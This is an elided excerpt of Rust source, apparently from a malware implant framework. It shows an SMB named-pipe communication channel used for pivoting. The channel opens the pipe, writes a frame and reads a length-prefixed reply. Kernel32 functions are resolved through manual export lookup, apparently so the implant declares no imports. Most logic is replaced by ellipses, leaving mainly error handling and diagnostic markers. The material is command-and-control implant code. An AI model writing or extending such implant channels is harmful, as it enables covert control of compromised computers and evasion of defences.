...
//! [`nyx_implant_core::resolve::export_addr`]. There is no `extern "system"` block — all
...
pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    ...
    if !send_recv_write(fns, handle, frame) {
        ...
        nyx_implant_core::diag::diag_mark(b"ERR_CH_SMB_WRITE");
        return None;
    }
...
unsafe fn send_recv_preflight(ctx: &ChannelCtx) -> Option<&'static K32Fns> {
    ...
    if ctx.smb_pipe_name.is_empty() {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_SMB_NOPIPE");
        return None;
    }
    if !unsafe { ensure_k32() } {
        ...
        // pointer.
        nyx_implant_core::diag::diag_mark(b"ERR_CH_SMB_NOAPI");
        return None;
    }
...
unsafe fn send_recv_open_pipe(fns: &K32Fns, pipe_name: &[u8]) -> Option<Handle> {
    ...
    if handle == INVALID_HANDLE || handle.is_null() {
        ...
        // pivot bring-up.)
        nyx_implant_core::diag::diag_mark(b"ERR_CH_SMB_OPEN");
        return None;
    }
    Some(handle)
}
...
unsafe fn send_recv_read(fns: &K32Fns, handle: Handle) -> Option<Vec<u8>> {
    ...
    if !read_exact(fns, handle, &mut prefix_buf) {
        unsafe { close(handle) };
        nyx_implant_core::diag::diag_mark(b"ERR_CH_SMB_RDPREFIX");
        return None;
    }
    ...
    if payload_len > MAX_FRAME {
        unsafe { close(handle) };
        nyx_implant_core::diag::diag_mark(b"ERR_CH_SMB_BIGRESP");
        return None;
    }
    ...
    unsafe { close(handle) };
    if !ok {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_SMB_RDPAYLOAD");
        return None;
    }
